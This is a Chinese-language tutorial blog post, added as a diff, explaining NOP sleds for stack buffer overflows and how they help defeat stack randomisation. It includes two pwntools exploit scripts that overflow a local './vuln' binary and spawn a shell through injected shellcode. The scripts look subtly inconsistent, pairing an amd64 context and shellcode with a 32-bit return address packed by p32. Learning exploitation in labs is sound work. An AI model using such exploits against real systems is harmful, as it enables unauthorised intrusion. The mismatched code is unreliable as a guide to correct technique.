@@ -1,0 +1,108 @@
+---
+title: 'NOPs'
+date: '2023-08-08'
+lastmod: '2023-08-20'
+tags: ['PWN', 'Stack']
+draft: false
+summary: '更可靠的 shellcode'
+authors: ['default']
+---
+
+由于在调试工具里得到的返回地址和正常运行时并不一致（这是运行时环境变量等因素有所不同造成的），
+所以这种情况下我们只能得到大致但不确切的 shellcode 起始地址，解决办法是在溢出 Padding 前面填充
+若干长度的 NOP 。
+
+NOP，无操作（**N**o **OP**eration）指令的作用正如其名：什么也不做。所以在运行到 NOP 指令的时候
+只会使程序计数器加一，而不会发生其它的事情。这是一种可以破解栈随机化的缓冲区溢出攻击方式。
+攻击者通过填充字符串注入攻击代码，在实际的攻击代码前注入很长的 NOP 指令序列，只要程序的
+控制流指向该序列任意一处，都可以无副作用地跳转到 shellcode 的起始处，这允许我们有更大的
+误差范围，因为向前或向后移动几个字节不会影响程序的正常运行。这与直接运行 shellcode 具有
+相同的效果。这种 NOP Padding 通常被称为 NOP Slide 或 NOP Sled（俗称「滑雪橇」），因为 EIP
+本质上是沿着它们 Slide 的。这样我们就可以通过增加 NOP 填充来试验 shellcode 的起始地址。NOP Sled
+可以帮助攻击者提高访问到自己的攻击代码的概率。
+
+[地址空间配置随机化（ASLR）](https://zh.wikipedia.org/wiki/%E4%BD%8D%E5%9D%80%E7%A9%BA%E9%96%93%E9%85%8D%E7%BD%AE%E9%9A%A8%E6%A9%9F%E8%BC%89%E5%85%A5) 指程序运行时栈的起始地址是随机的，所以程序中存放各函数返回地址
+的地址也会发生对应的改变。可防止运行相同程序的相同系统因易预测栈地址而被攻击。
+
+由于栈地址在一定范围的随机性，攻击者不能够知道攻击代码注入的地址，而要执行攻击代码需要将函数
+的返回地址更改为攻击代码的地址（可以通过缓冲区溢出的方式篡改函数的返回地址）。所以，只能在一
+定范围内（栈随机导致攻击代码地址一定范围内随机）枚举攻击代码的地址（有依据的猜）。
+
+:::info
+为了尝试破解 $2^{23}$ 的随机化，则需要枚举 $2^{23}$ 个返回地址。而使用 NOP Sled 的方式，
+若枚举一个 $2^{8}$ Bytes 的 NOP sled，则只需要枚举 $2^{23} / (2^{8} + 1)$ 个返回地址
+即可，因为每次枚举出的地址只要是 $2^{8}$ 中的之一就可以。（攻击代码本身有一个起始地址，
+所以为 $255 + 1$）
+:::
+
+不用 NOP Sled，函数返回地址 ---> 攻击代码<br />
+使用 NOP Sled，函数返回地址 ---> NOP 序列（顺序执行）直到攻击代码地址
+
+在 intel x86 汇编中，NOP 指令是 `\x90` 。
+
+NOP 指令是 `XCHG EAX, EAX` 的别名（32 bit 系统中），它实际上什么也不做。你可以在这个
+[问题](https://stackoverflow.com/questions/25008772/whats-the-difference-between-the-x86-nop-and-fnop-instructions) 上阅读更多相关信息。
+
+## 0x01 更新 Exploit
+
+现在可以对我们的 EXP 进行一些细微的更改，以完成两件事：
+
+- 添加大量 NOP Padding
+- 调整我们的返回地址以指向 NOP 的中间而不是缓冲区的开头
+
+:::warning
+确保 ASLR 仍处于禁用状态。你可能需要重新调整之前的 EXP，因为缓冲区位置可能会有所不同。
+:::
+
+```python:exp.py
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='info')
+
+context.binary = ELF('./vuln')
+
+p = process()
+
+payload = b'\x90' * 240             # 构建 NOPs
+payload += asm(shellcraft.sh())     # 构建 shellcode
+payload = payload.ljust(312, b'A')  # 溢出 Padding
+payload += p32(0xffffd664 + 120)    # 缓冲区地址 + 一半 NOPs 长度
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+:::warning
+值得一提的是：带有 NOP 的 shellcode 并不是万无一失的。如果出现用 NOP Sled 造成的
+意外错误，但 shellcode 在使用 NOP Sled 之前可以正常工作，请尝试减少 NOP Sled 的
+长度，因为它可能会篡改栈上的其它内容。
+:::
+
+注意：NOP 在某些架构中不是 `\x90` 。如果你需要其他架构的 NOP，可以使用 pwntools：
+
+```python
+nop = asm(shellcraft.nop())
+```
+
+## 0x02 最终 Exploit
+
+```python:exp.py
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='info')
+
+context.binary = ELF('./vuln')
+
+p = process()
+
+payload = asm(shellcraft.nop()) * 240  # 构建 NOPs
+payload += asm(shellcraft.sh())        # 构建 shellcode
+payload = payload.ljust(312, b'A')     # 溢出 Padding
+payload += p32(0xffffd664 + 120)       # 缓冲区地址 + 一半 NOPs 长度
+
+p.sendline(payload)
+
+p.interactive()
+```
+
